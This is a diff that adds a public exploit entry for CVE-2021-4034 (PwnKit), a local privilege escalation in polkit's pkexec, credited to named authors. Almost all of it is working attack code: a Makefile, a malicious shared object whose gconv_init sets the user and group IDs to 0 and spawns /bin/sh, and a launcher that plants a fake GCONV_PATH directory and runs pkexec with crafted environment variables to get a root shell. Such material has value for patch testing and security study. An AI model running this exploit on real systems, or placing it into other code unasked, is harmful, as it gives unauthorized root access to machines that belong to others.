@@ -1,0 +1,70 @@
+# Exploit Title: PolicyKit-1 0.105-31 - Privilege Escalation
+# Exploit Author: Lance Biggerstaff
+# Original Author: ryaagard (https://github.com/ryaagard)
+# Date: 27-01-2022
+# Github Repo: https://github.com/ryaagard/CVE-2021-4034
+# References: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
+
+# Description: The exploit consists of three files `Makefile`, `evil-so.c` & `exploit.c`
+
+##### Makefile #####
+
+all:
+	gcc -shared -o evil.so -fPIC evil-so.c
+	gcc exploit.c -o exploit
+
+clean:
+	rm -r ./GCONV_PATH=. && rm -r ./evildir && rm exploit && rm evil.so
+
+#################
+
+##### evil-so.c #####
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+void gconv() {}
+
+void gconv_init() {
+    setuid(0);
+    setgid(0);
+    setgroups(0);
+
+    execve("/bin/sh", NULL, NULL);
+}
+
+#################
+
+##### exploit.c #####
+
+#include <stdio.h>
+#include <stdlib.h>
+
+#define BIN "/usr/bin/pkexec"
+#define DIR "evildir"
+#define EVILSO "evil"
+
+int main()
+{
+    char *envp[] = {
+        DIR,
+        "PATH=GCONV_PATH=.",
+        "SHELL=ryaagard",
+        "CHARSET=ryaagard",
+        NULL
+    };
+    char *argv[] = { NULL };
+
+    system("mkdir GCONV_PATH=.");
+    system("touch GCONV_PATH=./" DIR " && chmod 777 GCONV_PATH=./" DIR);
+    system("mkdir " DIR);
+    system("echo 'module\tINTERNAL\t\t\tryaagard//\t\t\t" EVILSO "\t\t\t2' > " DIR "/gconv-modules");
+    system("cp " EVILSO ".so " DIR);
+
+    execve(BIN, argv, envp);
+
+    return 0;
+}
+
+#################
